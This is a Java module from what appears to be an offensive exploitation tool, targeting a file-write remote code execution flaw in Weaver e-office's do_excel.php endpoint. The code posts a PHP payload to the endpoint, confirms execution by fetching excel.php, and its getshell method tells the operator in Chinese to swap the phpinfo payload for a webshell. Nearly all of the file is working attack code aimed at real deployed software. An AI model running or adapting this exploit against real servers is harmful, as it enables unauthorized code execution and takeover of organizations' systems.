package Exp.OA.weaveroa;

import Utilss.HttpTools;
import Utilss.Response;
import core.Exploitlnterface;
import javafx.scene.control.TextArea;

import java.util.HashMap;

public class weaveroa_doExecl implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url, textArea);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        textArea.appendText("\n 由于该漏洞特殊性 请自行抓包修改phpinfo来写入shell进行利用");
        return false;
    }

    private Boolean att(String url,TextArea textArea){
        Response post = HttpTools.post(url + "/general/charge/charge_list/do_excel.php", "html=<?+phpinfo();?>", new HashMap<>(), "utf-8");
        Response response = HttpTools.get(url + "/general/charge/charge_list/excel.php", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains("disable_functions")){
            textArea.appendText("\n 漏洞存在 phpinfo已写入 \n" + url + "/general/charge/charge_list/excel.php");
            return true;
        }else {
            textArea.appendText("\n e-office doexecl.php-RCE-漏洞不存在 (出现误报请联系作者)");
            return false;
        }
    }
}
